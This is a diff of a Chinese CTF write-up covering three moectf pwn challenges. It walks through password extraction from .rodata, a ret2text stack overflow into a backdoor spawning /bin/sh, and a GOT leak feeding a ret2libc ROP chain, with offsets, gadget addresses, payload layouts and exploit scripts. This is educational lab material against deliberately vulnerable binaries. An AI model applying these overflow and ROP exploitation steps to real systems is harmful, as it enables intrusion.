@@ -282,30 +282,43 @@ pwn 是这次的大头，一共十五道，从最基础的「挖口令」一路�
 
 ### 1. 入门：藏在 .rodata 里的两个口令
 
-这是 pwn 方向的第一道入门题，题目就叫「入门」。拿到手是个 16KB 的 ELF，一开始我看 `checksec` 全绿（canary、NX、PIE、Full RELRO、SHSTK、IBT 全开了），还以为要搞什么高端操作，结果发现这题压根不是考内存破坏，就是考**能不能从二进制里把两个口令挖出来**。挺有意思，记录一下。
+题目叫「入门」，16KB 的 ELF。
 
-#### 前置知识：read 和 strcmp 的配合
+`checksec` 一跑，防护全绿：canary、NX、PIE、Full RELRO、SHSTK、IBT 全开。
 
-`read(fd, buf, count)` 从标准输入读一段字节到缓冲区，它**不会自动补 `\0`**。`strcmp(a, b)` 是逐字节比较两个字符串，直到遇到 `\0` 为止。这两件事凑在一起，就是这道题的骨架。
+按经验，防护全开通常意味着要打内存破坏。这个组合因该是在说反话——**这题没有溢出点**。
 
-另外提一句 `.rodata`：程序里的字符串字面量（提示语、口令、要执行的命令这些）都放在只读数据段 `.rodata` 里，用 `objdump -s -j .rodata` 就能直接 dump 出来看。
+程序只做一件事：让你输两个口令。口令对了就 `system("cat flag")`。
 
-#### 逆向分析
+所以整题的活只有一个：**把口令从二进制里挖出来**。
 
-先 `checksec`：
+#### 先看清 `read` 和 `strcmp` 的脾气
 
-```
-Arch:     amd64-64-little
-RELRO:    Full RELRO
-Stack:    Canary found
-NX:       NX enabled
-PIE:      PIE enabled
-SHSTK:    Enabled
-IBT:      Enabled
-Stripped: No
-```
+`read(fd, buf, count)` 从标准输入读字节。有个容易忽略的点：**它不会自动补 `\0`**。
 
-防护全开，说明这题的重心不在绕过防护。看 `main` 的汇编，逻辑特别直白，分两段：
+`strcmp(a, b)` 逐字节比较，遇到 `\0` 就停。
+
+两件事凑一起，就有了这题唯一的坑（后面会踩到）。
+
+顺便记住 `.rodata`：字符串字面量都放在这个只读段里，`objdump -s -j .rodata` 能直接 dump。
+
+#### 确认没被 strip
+
+`strings` 扫一眼，能看到编译器信息和一堆符号名：
+
+![strings 输出里有 GCC 版本和大量符号名](/pwn-rumen-03.png)
+
+有符号名，说明没 strip。函数名还在，逆向会轻松不少。
+
+`checksec` 的实际输出：
+
+![checksec：canary、NX、PIE、Full RELRO 全开](/pwn-rumen-02.png)
+
+防护全开，但没有溢出点。这两件事同时成立，方向就定了：**题目重心不在绕过防护**。
+
+#### 把 `main` 翻成人话
+
+逻辑分两段，每段一个 `read` 加一个 `strcmp`：
 
 ```c
 void main() {
@@ -329,11 +342,35 @@ void main() {
 }
 ```
 
-两个 `read` + 两个 `strcmp`，第二个 `strcmp` 通过之后就 `system("cat flag")`，flag 直接打印出来。所以整道题的难点就一个：**找到这两个口令是什么**。
+第二个 `strcmp` 通过，就走 `system("cat flag")`。
 
-#### 挖口令
+难点就一个：**这两个口令是什么**。
 
-口令就躺在 `.rodata` 里。`objdump -s -j .rodata pwn` 一 dump，几个字符串一目了然：
+#### 从 IDA 确认三处判断
+
+第一道门，`strcmp(buf1, 口令1)`：
+
+![IDA：第一道口令的比较](/pwn-rumen-07.png)
+
+图里 `strcmp` 的第二个参数是个字符串地址。那个地址指向的内容，就是口令。
+
+第二道门，结构一样，只是参数换了：
+
+![IDA：第二道口令的比较](/pwn-rumen-08.png)
+
+两道都过了，才走到这里：
+
+![IDA：两道门之后的 system("cat flag")](/pwn-rumen-09.png)
+
+整个 `main` 的控制流，三个判断框串成一条线：
+
+![IDA：main 的完整控制流](/pwn-rumen-10.png)
+
+到这里，要挖的东西已经确定了：**两个字符串常量**。
+
+#### 去 `.rodata` 里捞
+
+`objdump -s -j .rodata pwn` 一 dump，几个字符串一目了然：
 
 ```
 203b  32 31 34 37 34 38 33 36 34 37 0a 00   "2147483647\n"
@@ -342,7 +379,11 @@ void main() {
 20c7  63 61 74 20 66 6c 61 67 00             "cat flag"
 ```
 
-对应起来就是：
+完整输出：
+
+![objdump -s -j .rodata：口令和命令都在里面](/pwn-rumen-04.png)
+
+对应关系：
 
 | 位置 | 内容 | 作用 |
 |------|------|------|
@@ -350,13 +391,23 @@ void main() {
 | `0x209e` | `Welcometomoectf2026pwn` | 第二个口令 |
 | `0x20c7` | `cat flag` | 通关后执行的命令 |
 
-注意这两个口令后面都跟了个 `\n`。原因是 `read` 会把你敲的回车也一起读进去，所以 `strcmp` 比较的目标字符串里也带了换行。我一开始没注意这个，还纠结了半天为什么口令后面多个换行符，其实想想 `read` 不补 `\0`、回车也会被读进去，就通了。
+#### 两个口令后面都跟着 `\n`
 
-第二个口令里那个 `moectf2026` 也算个彩蛋，直接暗示了这题是 moectf 的题。
+注意 `2147483647` 和 `Welcometomoectf2026pwn` 末尾都有 `0a`，也就是 `\n`。
 
-#### 利用脚本
+一开始我没在意这个，按纯字符串发过去，`strcmp` 死活不相等。
 
-这题的远程环境不是 `nc`，是平台给的一个 `wss` 地址（西安电子科技大学的 CTF 平台，用 websocket 转发流量）。所以脚本我用 `websockets` 库写的，逻辑就两步：
+回头想 `read` 的行为就通了：**你敲的回车也会被读进缓冲区**。所以 `buf` 里实际是 `2147483647\n`。
+
+`strcmp` 比的是完整字节。少一个 `\n`，长度就对不上。
+
+脚本里的口令必须带上换行。
+
+第二个口令里藏着 `moectf2026`，直接写明这是 moectf 的题。
+
+#### 写脚本
+
+远程不是 `nc`，是平台给的 `wss` 地址。用 `websockets` 连，逻辑两步：
 
 ```python
 import asyncio
@@ -384,38 +435,44 @@ async def main():
 asyncio.run(main())
 ```
 
-跑起来先回显 `Hello,my friend...`，发第一个口令后回 `Welcome to pwn world!` 和 `Input your answer:`，再发第二个口令，`Congratulations!` 后面直接就是 flag。程序执行完 `system("cat flag")` 就退出，websocket 也就断了，所以结尾用超时/连接关闭来收尾。
+跑起来先回显 `Hello,my friend...`。发第一个口令，回 `Welcome to pwn world!` 和 `Input your answer:`。
 
-#### 小结
+再发第二个，`Congratulations!` 后面就是 flag。
 
-这道入门题其实没考溢出，考的是最基础的两件事：
+程序跑完 `system("cat flag")` 就退出，websocket 跟着断。所以结尾用超时收尾。
 
-1. **会看 `.rodata`**：字符串字面量都在里面，口令、命令一 dump 就现形。
-2. **理解 `read` 的细节**：它读回车、不补 `\0`，所以口令后面带 `\n` 不是笔误。
+#### 这题学到什么
 
-真正的栈溢出、ret2syscall、ret2libc 这些后面几题才会碰到，这题就是让你先熟悉一下 pwn 题目的长相和分析流程。踩稳这一小步，后面才好往下走。
+没考溢出，考两件基础事：
+
+1. **字符串常量在 `.rodata`**，dump 一下就能捞。
+2. **`read` 会读回车、不补 `\0`**，所以口令后面带 `\n` 不是笔误。
+
+栈溢出、ret2syscall、ret2libc 后面几题才碰。这题先熟悉 pwn 题的长相和分析流程。
 
 ---
 
 ### 2. 走后门：ret2text 初体验
 
-这是 pwn 方向的第二题，名字叫「走后门」。题干就一句：「据说，只要给的够多就能走后门…是真的吗？」。题目提示里也明说了这题考的是 ret2text，是 pwn 里最最基础的一种攻击方式。对刚入门的人来说，这题特别适合把「栈溢出」和「返回地址」这两个概念彻底搞明白，所以这篇我会写得啰嗦一点，把每一步都拆开讲。
+题干一句话：「据说，只要给的够多就能走后门…是真的吗？」
 
-#### 前置知识：栈溢出和返回地址
+提示里写明考 ret2text。这是 pwn 里最基础的攻击方式，也是「栈溢出」和「返回地址」这两个概念的第一次实战。
 
-先补几个最基础的概念，后面都要用到。
+#### 前置知识：栈、返回地址、栈溢出
 
-**栈（stack）**：程序运行时的一块内存，用来放局部变量、函数参数、返回地址这些东西。它从高地址往低地址长，每调用一个函数，就会在栈顶「压」一块空间出来，这块空间叫**栈帧（stack frame）**。
+**栈**：程序运行时的一块内存，放局部变量、函数参数、返回地址。它从高地址往低地址长，每调一个函数就压一块空间，叫**栈帧**。
 
-**返回地址（return address）**：CPU 执行 `call` 指令调用函数时，会先把「下一句指令的地址」压到栈上，这样函数执行完 `ret` 的时候，就能跳回原来的地方继续跑。这个被压进栈的地址，就是返回地址。
+**返回地址**：`call` 指令执行时，先把「下一句指令的地址」压进栈。函数执行完 `ret`，就从栈上取这个地址跳回去。
 
-**栈溢出（stack overflow）**：往一个局部变量（缓冲区）里写的数据太多了，越过了缓冲区本来的边界，把栈上「更高地址」的东西给盖掉了。而返回地址正好在缓冲区的高地址方向，所以溢出一旦够远，就能把返回地址改掉——这就是 ret2text 的核心思路。
+**栈溢出**：往局部变量里写的数据太多，越过了边界，把栈上更高地址的东西盖掉了。
 
-关键点在于：**返回地址在缓冲区的「上面」（更高地址），溢出就是一路往上盖**。
+返回地址正好在缓冲区的高地址方向。**溢出一旦够远，就能改掉返回地址。**
 
-#### 先看防护：checksec
+这就是 ret2text 的核心。
 
-拿到二进制先跑 `checksec`，看看开了哪些防护：
+#### 先看防护
+
+拿到二进制先 `checksec`：
 
 ```
 Arch:     amd64-64-little
@@ -426,20 +483,37 @@ PIE:      No PIE (0x400000)
 Stripped: No
 ```
 
-逐条解释一下这些名词（萌新重点看这里）：
+实际终端输出：
 
-- **Canary（栈金丝雀）**：`No canary found`，说明**没开**。它本来是一个放在返回地址前面的随机值，函数返回前会检查它有没有被动过，被盖掉就报错退出。没开 canary，意味着我们溢出的时候**不用担心会踩到它**。
-- **NX（栈不可执行）**：`NX enabled`，**开了**。意思是栈上的数据不能当代码执行，所以不能直接往栈里塞 shellcode 去跑。不过没关系，这题我们不需要自己写 shellcode。
-- **PIE（地址随机化）**：`No PIE`，**没开**。程序加载的基址固定是 `0x400000`，所以代码的地址都是写死的，`backdoor` 函数的地址不会变。这对我们来说是好事，直接填死地址就行。
-- **RELRO**：Partial RELRO，这题用不上 GOT 表攻击，先不管它。
+![checksec 输出：没 canary、没 PIE，只开了 NX](/pwn-backdoor-01.png)
 
-总结一下：没 canary、没 PIE，就开了个 NX。这种配置对新手非常友好——**返回地址随便盖，目标函数地址是固定的**。
+四条防护逐条看：
 
-#### 逆向分析：三个函数
+**Canary**：`No canary found`，没开。它是放在返回地址前面的随机值，函数返回前会检查有没有被改。没开，溢出时不用管它。
 
-`objdump -d` 反汇编，能看到三个关键函数：`init`、`backdoor`、`vuln`、`main`。先看重点。
+**NX**：`NX enabled`，开了。栈上的数据不能当代码跑，塞 shellcode 这条路走不通。不过这题用不上 shellcode。
 
-##### backdoor：现成的后门
+**PIE**：`No PIE`，没开。程序基址固定 `0x400000`，所有代码地址写死。`backdoor` 的地址不会变，直接填。
+
+**RELRO**：Partial RELRO。这题不打 GOT，先不管。
+
+没 canary、没 PIE，只开了 NX。**返回地址随便盖，目标地址固定。**
+
+#### 先手动试一下
+
+写脚本之前，先手动喂一坨超长数据：
+
+![输入一堆 A，程序直接 Segmentation fault](/pwn-backdoor-02.png)
+
+`Segmentation fault` 就是信号。返回地址已经被盖坏，程序 `ret` 时跳到了一个不存在的地址。
+
+**溢出的距离够长，这条路成立。**
+
+#### 逆向：四个函数
+
+`objdump -d` 能看到 `init`、`backdoor`、`vuln`、`main` 四个函数。
+
+**（1）backdoor：现成的后门**
 
 ```
 0000000000401209 <backdoor>:
@@ -457,11 +531,15 @@ Stripped: No
   401231: ret
 ```
 
-`backdoor` 就是题目说的「后门」。它打印一句话，然后调用 `system("/bin/sh")` 给我们弹一个 shell。`/bin/sh` 这个字符串就在 `0x40203a`。我们的目标，就是让程序执行到这里。
+打印一句话，然后 `system("/bin/sh")`。`/bin/sh` 这个字符串在 `0x40203a`。
 
-所以这题不需要自己拼 shellcode 或者找 libc，**后门函数就躺在程序里，只要把返回地址改成它就行了**，这就是 ret2text（ret 到 .text 段里的现成代码）。
+把 `.rodata` 整段 dump 出来，提示语和 `/bin/sh` 都在：
 
-##### vuln：漏洞点
+![objdump -s -j .rodata：提示语、/bin/sh 都在里面](/pwn-backdoor-03.png)
+
+**后门函数躺在程序里，把返回地址改成它就行。** 不用拼 shellcode，不用找 libc。
+
+**（2）vuln：漏洞点**
 
 ```
 0000000000401232 <vuln>:
@@ -494,7 +572,11 @@ Stripped: No
   4012c0: ret
 ```
 
-翻译成 C 大概长这样：
+IDA 里更直观。`jle` 把「`size <= 0` 就退出」和「正常 `read`」分成两条路：
+
+![IDA 里 jle 分出两条路，下面那条才是我们要走的](/pwn-backdoor-04.png)
+
+翻译成 C：
 
 ```c
 void vuln() {
@@ -509,71 +591,80 @@ void vuln() {
 }
 ```
 
-漏洞一目了然：`buf` 只有 `0x40`（64）字节，但 `read` 读多少是**我们自己通过 `size` 控制的**。只要 `size` 填一个比 64 大的数（比如 256），就能读 256 字节进来，把缓冲区撑爆，一路往上盖到返回地址。这就是题干里「给的够多就能走后门」的意思——**给的数据够多，就能溢出到返回地址**。
+`buf` 只有 `0x40`（64）字节。`read` 读多少，由我们填的 `size` 决定。
 
-#### 算偏移：从 buf 到返回地址有多远
+`size` 填 256，就读 256 字节进来。缓冲区撑爆，一路盖到返回地址。
 
-这是 ret2text 里最关键的一步，必须算准。
+题干那句「给的够多就能走后门」，说的就是这个。
 
-从上面的汇编能看到两个关键地址：
+#### 算偏移
 
-- 缓冲区 `buf` 在 `rbp - 0x40`
-- 返回地址在 `rbp + 8`（因为 `push rbp` 压了 8 字节的旧 rbp，再往上 8 字节才是返回地址）
+从汇编能读到两个位置：
 
-栈帧布局大概是：
+- `buf` 在 `rbp - 0x40`
+- 返回地址在 `rbp + 8`（`push rbp` 压了 8 字节旧 rbp，再往上 8 字节）
+
+栈帧布局：
 
 ```
 高地址
-  rbp + 8   ── 返回地址（我们要覆盖的目标）
+  rbp + 8   ── 返回地址（要覆盖的目标）
   rbp + 0   ── 保存的旧 rbp（8 字节）
   rbp - 0x40 ── buf 缓冲区（64 字节）
-  rbp - 0x44 ── size 变量（4 字节，跟 buf 紧挨着）
+  rbp - 0x44 ── size 变量（4 字节，紧挨着 buf）
   ...
 低地址
 ```
 
-从 `buf`（rbp-0x40）到返回地址（rbp+8）的距离：
+IDA 里把栈帧摊开，形状一样。`buf` 占 64 字节，上面是旧 rbp，再上面是返回地址：
+
+![栈帧图：buf 在 rbp-0x40，返回地址在 rbp+8](/pwn-backdoor-05.png)
+
+距离：
 
 ```
 0x40 + 8 = 0x48 = 72 字节
 ```
 
-所以 payload 的布局就是：
+payload 布局：
 
 ```
-72 字节填充 + 8 字节的 backdoor 地址
+72 字节填充 + 8 字节 backdoor 地址
 ```
 
-前 72 字节随便填（通常用 `'A'`），紧接着 8 字节填返回地址（小端序）。
+前 72 字节随便填（一般用 `A`），后 8 字节填地址，小端序。
 
-#### 一个容易踩的坑：scanf 把换行符吞了
+#### 坑一：`scanf` 把换行吞了
 
-这里有个特别容易算错的地方，我一开始就在这栽了。
+这个坑我一开始就栽了。
 
-`scanf("%d", &size)` 读完数字 `256` 之后，会把后面那个换行符 `\n` **读进它自己的缓冲区里，但不会留在内核的输入里**。也就是说，接下来 `read(0, buf, size)` 从文件描述符直接读的时候，是**看不到那个 `\n` 的**。
+`scanf("%d", &size)` 读完 `256` 之后，会把后面那个 `\n` 读进它自己的缓冲区，**不会留在内核的输入队列里**。
 
-所以我一开始以为「read 会先吃掉那个残留的换行符」，把偏移算成了 `72 - 1 = 71`，结果覆盖的地址整体偏了一位，直接崩了。正确的偏移就是 **72**，`\n` 已经被 scanf 处理掉了，别给它留位置。
+接下来 `read(0, buf, size)` 直接读 fd，看不到那个 `\n`。
 
-> 补充：`init()` 里调了 `setbuf(stdin, NULL)`，把 stdin 设成了无缓冲模式，所以 scanf 是一个字节一个字节从内核读的，读完 `\n` 会把它塞进 FILE 结构体的 pushback 槽里，`read()` 这个系统调用自然就看不见了。这俩一个是走 stdio（FILE*），一个是走系统调用（fd），混用就出这种幺蛾子。
+我当时的想法是「`read` 会先吃掉残留的换行」，于是把偏移算成 `72 - 1 = 71`。结果整个地址错位一格，直接崩。
 
-#### 另一个坑：栈对齐
+正确偏移就是 **72**。
 
-还有一个稍微进阶一点的点，新手可以先跳过，但最好了解一下。
+> 补充：`init()` 里调了 `setbuf(stdin, NULL)`，stdin 变成无缓冲。`scanf` 一个字节一个字节从内核读，读完 `\n` 把它塞进 FILE 结构体的 pushback 槽。`read()` 走的是系统调用，自然看不见。一个走 stdio，一个走 fd，混用就出这种事。
 
-`system()` 内部用到了 `movaps` 这种指令，它要求**栈是 16 字节对齐**的，不对齐就会段错误崩掉。
+#### 坑二：栈对齐
 
-如果直接 `ret` 到 `backdoor` 的开头 `0x401209`，函数会先 `push rbp` 再调 `system`，这个过程中栈的对齐会差 8 字节，`system` 里就可能崩。
+`system()` 内部用 `movaps`，要求栈 16 字节对齐。不对齐就段错误。
 
-解决办法有两个：
+直接 `ret` 到 `backdoor` 开头 `0x401209`，函数先 `push rbp` 再调 `system`，这个过程栈对齐差 8 字节。
 
-1. **加一个 `ret` gadget 再跳 backdoor**：`ret` 这条指令会把栈指针再弹 8 字节，正好把对齐纠正过来。payload 变成 `填充 + ret地址 + backdoor地址`。
-2. **直接跳到 `0x401220`**（我用的这个）：这是 backdoor 里 `lea "/bin/sh"` 那一句，正好在 `call puts` 之后。从这里开始就没有 `push rbp` 了，直接 `lea` → `mov` → `call system`，栈对齐天然是对的，还省一个 gadget。
+两种解法：
 
-我选了第 2 种，简单省事。`0x401220` 就是 `lea 0x40203a, rax` 那句（`/bin/sh`），跟着 `mov rdi, rax; call system`。
+**（1）加一个 `ret` 垫片**：`ret` 把栈指针再弹 8 字节，对齐就正了。payload 变成 `填充 + ret地址 + backdoor地址`。
 
-#### 利用脚本
+**（2）直接跳到 `0x401220`**：这是 `lea "/bin/sh"` 那一句，正好在 `call puts` 之后。从这里开始没有 `push rbp`，直接 `lea` → `mov` → `call system`，对齐天然正确，还省一个 gadget。
 
-远程环境还是平台给的 wss 地址。脚本里注意「先发数字，等提示，再发 payload」这个顺序，因为 `read` 是等我们发数据才往下走的：
+我用的是第二种。`0x401220` 就是 `lea 0x40203a, rax`，后面跟着 `mov rdi, rax; call system`。
+
+#### 写脚本
+
+远程是平台给的 `wss` 地址。脚本注意顺序：**先发数字，等提示，再发 payload**。`read` 是等数据到了才往下走。
 
 ```python
 import asyncio
@@ -605,17 +696,23 @@ async def main():
 asyncio.run(main())
 ```
 
-跑起来之后，`read` 读进我们发的 80 字节，返回地址被覆盖成 `0x401220`，函数 `ret` 的时候直接跳进 backdoor 执行 `system("/bin/sh")`，弹出一个 shell。然后我们发 `cat flag`，flag 就回显出来了。
+`read` 读进我们发的 80 字节，返回地址变成 `0x401220`。函数 `ret` 时跳进 backdoor，执行 `system("/bin/sh")`。
 
-#### 小结
+shell 弹出来，发 `cat flag` 就回显。
 
-这道题把 ret2text 的完整流程走了一遍：
+![本地跑通：payload 发过去，shell 直接弹出来](/pwn-backdoor-06.png)
 
-1. **找漏洞点**：`read(0, buf, size)`，size 自己控制，能溢出。
-2. **找后门**：`backdoor` 函数里有现成的 `system("/bin/sh")`。
-3. **算偏移**：`rbp-0x40` 到 `rbp+8`，正好 72 字节。
-4. **绕防护**：没 canary 不用管，没 PIE 地址固定，NX 无所谓（我们跳的是现成代码）。
-5. **细节坑**：scanf 吞换行符、system 的栈对齐。
+#### 这题学到什么
+
+ret2text 的完整流程走了一遍：
+
+1. **找漏洞点**：`read(0, buf, size)`，`size` 自己控制。
+2. **找后门**：`backdoor` 里有现成的 `system("/bin/sh")`。
+3. **算偏移**：`rbp-0x40` 到 `rbp+8`，72 字节。
+4. **看防护**：没 canary 不用管，没 PIE 地址固定，NX 无所谓。
+5. **两个细节坑**：`scanf` 吞换行、`system` 的栈对齐。
+
+ret2syscall、ret2libc 都在这条路上加难度——没有现成后门怎么办、地址随机了怎么办。
 
 ret2text 是 pwn 的第一块敲门砖，后面的 ret2syscall、ret2libc 都是在它基础上加难度（比如没现成后门了怎么办、地址随机了怎么办）。这道题踩稳了，后面就好走。
 
@@ -623,32 +720,33 @@ ret2text 是 pwn 的第一块敲门砖，后面的 ret2syscall、ret2libc 都是
 
 ### 3. Hello-World：fmt 泄露地址 + ret2libc
 
-第三题名字叫「Hello-World」。题干说：「初学 pwn 的你一定认识了 C 语言，那想必对 Hello-World 倒背如流了吧……等等，这个输出函数好像不太正常🤔」。
+题干：「初学 pwn 的你一定认识了 C 语言，那想必对 Hello-World 倒背如流了吧……等等，这个输出函数好像不太正常🤔」
 
-这题比上一道 ret2text 又进了一步：**上一题程序里自带一个现成的后门函数，这题没有**，得自己想办法调用 libc 里的 `system` 拿 shell，也就是 **ret2libc**。而且这题要先从一个「填空题」里把 libc 的地址泄露出来。整个过程串起来挺经典的，我把每一步都拆开讲。
+上一题有现成的后门函数，这题没有。得自己去 libc 里调 `system`。
 
-#### 前置知识：ret2libc 是什么
+这就是 ret2libc。而且要先用一个「填空题」把 libc 地址泄露出来。
 
-先回忆一下上一题：ret2text 是「把返回地址改成程序里现成的后门函数」。但很多题目里根本没有这种现成后门，那怎么办？
+#### 前置知识：为什么需要「泄露」
 
-答案是 **ret2libc**：程序链接了 libc（标准 C 库），libc 里有一大堆好用的函数，其中 `system("/bin/sh")` 能直接弹 shell。libc 是动态链接进来的，所以我们只要：
+ret2text 是「把返回地址改成程序里的后门」。没有后门怎么办？
 
-1. **知道 libc 被加载到哪个地址**（libc 基址）。
-2. 把返回地址改成 libc 里的 `system`，参数传 `"/bin/sh"`。
+程序链接了 libc，里面有 `system`。把返回地址改成 `system`，参数传 `/bin/sh`，就能弹 shell。
 
-问题在于第 1 步：**libc 的加载地址是随机的（ASLR）**，每次运行都不一样。所以必须先「泄露」出一个 libc 里的函数地址，再反推出基址。
+问题在地址。
 
-这就引出了两个关键概念：
+libc 的加载地址每次运行都变（ASLR）。**直接写死 `system` 的地址，跑一次崩一次。**
 
-**GOT 表（Global Offset Table）**：动态链接的程序，调用 libc 函数时并不是直接知道函数在哪，而是通过一张表（GOT）间接跳转。程序第一次调用某个函数后，GOT 表里就会填上这个函数**在 libc 里的真实地址**。所以读 GOT 表，就能拿到 libc 函数的真实地址。
+所以要先做一件事：**从程序里读出一个 libc 函数的真实地址，减去它的偏移，反推出 libc 基址。**
 
-**PLT 表（Procedure Linkage Table）**：程序里 `call puts` 这种，其实是先跳到 PLT，PLT 再跳到 GOT 里存的真实地址。
+两个概念：
 
-一句话：**GOT 表里存着 libc 函数的真实地址，把它读出来就完成了泄露**。
+**GOT 表**：动态链接的程序调用 libc 函数时，不直接知道函数在哪，而是通过 GOT 间接跳转。程序第一次调用某函数后，GOT 里就填上了它的真实地址。**读 GOT，就拿到了真实地址。**
+
+**PLT 表**：`call puts` 实际是先跳到 PLT，PLT 再跳到 GOT 里存的地址。
+
+一句话：**GOT 里存着 libc 函数的真实地址，读出来就完成了泄露。**
 
 #### 先看防护
-
-`checksec`：
 
 ```
 Arch:     amd64-64-little
@@ -659,18 +757,26 @@ PIE:      No PIE (0x3fe000)
 Stripped: No
 ```
 
+侦察三连的实际输出：
+
+![checksec + nm + 两条空 grep，没有后门也没有 /bin/sh](/pwn-helloworld-01.png)
+
+图上最后两条 `grep` 都是空的：`nm | grep system` 没东西，`strings | grep /bin/sh` 也没东西。
+
+**这就是转折点。** 程序里既没有后门函数，也没有 `/bin/sh`。
+
+四条防护：
+
 - **No canary**：溢出不用管金丝雀。
-- **NX enabled**：栈不可执行，不能塞 shellcode，正好用 ret2libc。
-- **No PIE**：程序本身地址固定，GOT 表地址也固定（这对我们读 GOT 很关键）。
-- **Partial RELRO**：GOT 表可写，不过这题用不上改写 GOT，直接读就行。
+- **NX enabled**：栈不可执行，塞 shellcode 走不通，正好用 ret2libc。
+- **No PIE**：程序地址固定，**GOT 表地址也固定**。这一点很关键，读 GOT 得知道 GOT 在哪。
+- **Partial RELRO**：GOT 可写。这题不改写 GOT，只读，用不上。
 
-题目还附带了一个 `libc.so.6`（`RUNPATH` 是 `.`，说明程序就用这个 libc），我们要用它来算偏移。
+题目还附了一个 `libc.so.6`。`RUNPATH` 是 `.`，说明程序就用这个 libc。算偏移得用它。
 
-#### 逆向分析：两个函数
+#### 逆向：`main` 是个泄露机关
 
-##### main：一个「填空题」负责泄露
-
-`main` 打印了一段 Hello World 的代码骨架，中间有个空让你填：
+`main` 打印一段 Hello World 的代码骨架，中间留了个空：
 
 ```
 Check your programming skill:
@@ -685,7 +791,7 @@ int main(){
 Your answer:
 ```
 
-然后读入你的答案（最多 31 字节），去掉换行后做 `strcmp` 比较。关键逻辑：
+读入答案（最多 31 字节），去掉换行，然后 `strcmp`：
 
 ```c
 char buf[0x20];
@@ -707,9 +813,21 @@ else {
 vuln();
 ```
 
-也就是说，**这道填空题的答案其实是 `printf`（正常应该填 `printf` 输出 Hello World），但题目故意把它做成「泄露地址」的机关**：你填 `puts` 或 `printf`，它就把对应函数在 GOT 里的真实地址用 `%p` 打出来。这就是题干说的「输出函数不太正常」——好好的 printf 被拿来泄露地址了。
+正常这题该填 `printf`。但题目把它做成了机关：**填 `puts` 或 `printf`，它就把对应函数的 GOT 内容用 `%p` 打出来。**
 
-汇编里对应的是（填 `puts` 那一段）：
+题干说的「输出函数不太正常」，指的就是这个。
+
+IDA 里两段分支长这样。先看 `puts` 那条：
+
+![IDA：read + strcspn + strcmp("puts")](/pwn-helloworld-02.png)
+
+再看 `printf` 那条，结构一样，只是 GOT 项不同：
+
+![IDA：strcmp("printf") 那条分支](/pwn-helloworld-03.png)
+
+> 注意 `strcspn(buf, "\n")` 这一句。`read` 会把回车也读进去，不去掉的话 `strcmp(buf, "puts")` 永远比不过 —— `buf` 里是 `"puts\n"`。
+
+汇编里填 `puts` 那段：
 
 ```asm
 401301: mov    0x403fe0, rax      ; rax = [puts@GOT] = puts 真实地址
@@ -718,11 +836,9 @@ vuln();
 401317: call   printf             ; printf("...%p\n", puts_addr)
 ```
 
-`0x403fe0` 就是 `puts` 的 GOT 表项。填 `printf` 那段同理，读的是 `0x403fe8`（`printf` 的 GOT）。
+`0x403fe0` 是 `puts` 的 GOT 表项。填 `printf` 那段读的是 `0x403fe8`。
 
-##### vuln：真正的溢出点
-
-`main` 最后调用了 `vuln`：
+#### 真正的溢出点在 `vuln`
 
 ```c
 void vuln() {
@@ -732,19 +848,23 @@ void vuln() {
 }
 ```
 
-缓冲区 64 字节，却读 200 字节，明显溢出。偏移和上一题一样：
+`buf` 64 字节，读 200 字节。溢出。
+
+IDA 里确认一下 `buf` 的位置：
+
+![IDA：vuln 里 buf 在 rbp-0x40，读 0xc8 字节](/pwn-helloworld-04.png)
+
+偏移：
 
 - `buf` 在 `rbp-0x40`
 - 返回地址在 `rbp+8`
-- 偏移 = `0x40 + 8 = 72` 字节
+- `0x40 + 8 = 72`
 
-#### 攻击流程
+**和上一题一样。** 但这次不是覆盖一个地址，是覆盖一条链。
 
-分两大步：**先泄露，再溢出**。
+#### 第一步：泄露 `puts`
 
-##### 第一步：泄露 puts 地址
-
-连接上去，先收下 Hello World 骨架，然后发 `puts`，程序就回一句：
+连上去，收下骨架，发 `puts`，程序回一句：
 
 ```
 This function seems to be unsafe,right? 0x7f8a0ee89420
@@ -752,15 +872,13 @@ This function seems to be unsafe,right? 0x7f8a0ee89420
 
 这个 `0x7f8a0ee89420` 就是 `puts` 在 libc 里的真实地址。
 
-##### 第二步：算 libc 基址
-
-有了 `puts` 的地址，减去 `puts` 在 libc 里的偏移，就得到 libc 基址：
+#### 第二步：算基址
 
 ```
 libc_base = puts_addr - puts_offset
 ```
 
-`puts_offset` 用题目给的 libc 算（`pwn` 的 `ELF` 一读就有）：
+`puts_offset` 从题目给的 libc 里读：
 
 ```
 puts    0x84420
@@ -769,32 +887,44 @@ system  0x52290
 /bin/sh 0x1b45bd
 ```
 
-比如泄露出来 `puts = 0x7f8a0ee89420`，那么 `libc_base = 0x7f8a0ee89420 - 0x84420 = 0x7f8a0ee05000`（正好是页对齐的，说明没算错）。
+代入：`0x7f8a0ee89420 - 0x84420 = 0x7f8a0ee05000`。
 
-##### 第三步：找 gadget 和关键地址
+**结果页对齐（末尾三个 0）**，说明算对了。不对齐就是泄露值抠错了。
 
-ret2libc 要调 `system("/bin/sh")`，在 x86-64 下，第一个参数通过 `rdi` 寄存器传。所以需要一个 **`pop rdi; ret`** gadget 来把 `"/bin/sh"` 的地址塞进 `rdi`。
+#### 第三步：找 gadget
 
-这题程序很小，没有现成的 `pop rdi; ret`，但没关系——**libc 里一抓一大把**。用 `ROPgadget` 或者直接搜字节 `5f c3`（`pop rdi; ret` 的机器码），找到偏移 `0x23b6a`：
+`system("/bin/sh")` 在 x86-64 下第一个参数走 `rdi`。需要一个 **`pop rdi; ret`** 把 `/bin/sh` 的地址塞进 `rdi`。
 
-```
-libc_base + 0x23b6a  ->  pop rdi; ret
-```
+程序很小，没有这个 gadget。**但 libc 里一抓一大把。**
 
-##### 第四步：栈对齐（一个坑）
+`ROPgadget` 或者直接搜字节 `5f c3`，得到偏移 `0x23b6a`。
 
-`system` 内部有 `movaps` 指令，要求栈 16 字节对齐，不对齐会崩。直接 `ret` 进 `system` 时栈会差 8 字节，所以在 `pop rdi; ret` 前面再加一个单独的 `ret`（偏移 `0x23b6b`）把栈对齐纠正过来。
+`libc_base + 0x23b6a` 就是 `pop rdi; ret` 的地址。
 
-所以 ROP 链是这样的：
+量这几个偏移的完整过程：
+
+![量 libc 偏移：readelf / strings / ROPgadget](/pwn-helloworld-05.png)
+
+> `strings -t x libc.so.6` 报的是**文件偏移**。libc 的加载基址是 `0x0`，段的 VMA 和文件偏移相等，**所以这个数直接就是偏移，不用换算**。
+> 可执行文件不一样，那个要加 `0x400000` 的差值。
+
+#### 第四步：栈对齐
+
+`system` 内部有 `movaps`，要求栈 16 字节对齐。不对齐就崩。
+
+直接 `ret` 进 `system`，栈差 8 字节。所以在 `pop rdi; ret` 前面垫一个单独的 `ret`（偏移 `0x23b6b`）。
+
